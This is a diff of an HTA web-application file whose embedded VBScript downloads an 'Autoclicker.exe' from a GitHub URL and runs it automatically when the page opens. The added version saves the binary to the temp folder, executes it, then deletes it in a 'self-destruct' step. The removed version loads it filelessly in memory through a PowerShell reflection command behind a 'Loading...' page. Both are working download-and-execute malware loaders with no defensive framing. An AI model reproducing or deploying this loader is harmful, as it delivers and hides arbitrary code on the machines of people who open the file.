@@ -1,38 +1,50 @@
 <html>
 <head>
+  <title>Execute EXE from HTA</title>
   <script language="VBScript">
-    Set objShell = CreateObject("WScript.Shell")
-    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-    Set objADODBStream = CreateObject("ADODB.Stream")
+    Sub RunExe
+      ' Raw GitHub URL to the EXE file
+      exeUrl = "https://github.com/terrorize7/testing-exes/raw/refs/heads/main/Autoclicker.exe"
 
-    ' URL to the Autoclicker.exe file on GitHub
-    url = "https://github.com/terrorize7/testing-exes/raw/refs/heads/main/Autoclicker.exe"
+      ' Temporary file path to save the EXE
+      tempPath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\Autoclicker.exe"
 
-    ' Download the file
-    objXMLHTTP.Open "GET", url, False
-    objXMLHTTP.Send
+      ' Download the EXE file
+      Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
+      xmlHttp.Open "GET", exeUrl, False
+      xmlHttp.Send
 
-    ' Save the file to memory
-    objADODBStream.Open
-    objADODBStream.Type = 1 ' Binary
-    objADODBStream.Write objXMLHTTP.ResponseBody
-    objADODBStream.Position = 0
+      ' Save the EXE to the temporary location
+      If xmlHttp.Status = 200 Then
+        Set adoStream = CreateObject("ADODB.Stream")
+        adoStream.Open
+        adoStream.Type = 1 ' Binary
+        adoStream.Write xmlHttp.ResponseBody
+        adoStream.SaveToFile tempPath, 2 ' Overwrite if file exists
+        adoStream.Close
 
-    ' Execute the file from memory
-    objShell.Run "powershell -Command ""$bytes = [System.Convert]::FromBase64String('" & Base64Encode(objADODBStream.Read) & "'); $assembly = [System.Reflection.Assembly]::Load($bytes); $entryPoint = $assembly.EntryPoint; $entryPoint.Invoke($null, $null)"""
-    objADODBStream.Close
+        ' Execute the EXE
+        Set shell = CreateObject("WScript.Shell")
+        shell.Run """" & tempPath & """", 1, False
 
-    Function Base64Encode(binaryData)
-      Dim xmlDoc, xmlNode
-      Set xmlDoc = CreateObject("MSXML2.DOMDocument")
-      Set xmlNode = xmlDoc.CreateElement("base64")
-      xmlNode.DataType = "bin.base64"
-      xmlNode.nodeTypedValue = binaryData
-      Base64Encode = xmlNode.Text
-    End Function
+        ' Wait for the EXE to finish running
+        WScript.Sleep 5000 ' Adjust the delay as needed
+
+        ' Self-destruct: Delete the temporary EXE after execution
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        If fso.FileExists(tempPath) Then
+          fso.DeleteFile tempPath
+        End If
+      Else
+        MsgBox "Failed to download the EXE file.", vbCritical, "Error"
+      End If
+    End Sub
   </script>
 </head>
 <body>
-  <h1>Loading...</h1>
+  <h1>Executing EXE...</h1>
+  <script language="VBScript">
+    RunExe
+  </script>
 </body>
 </html>
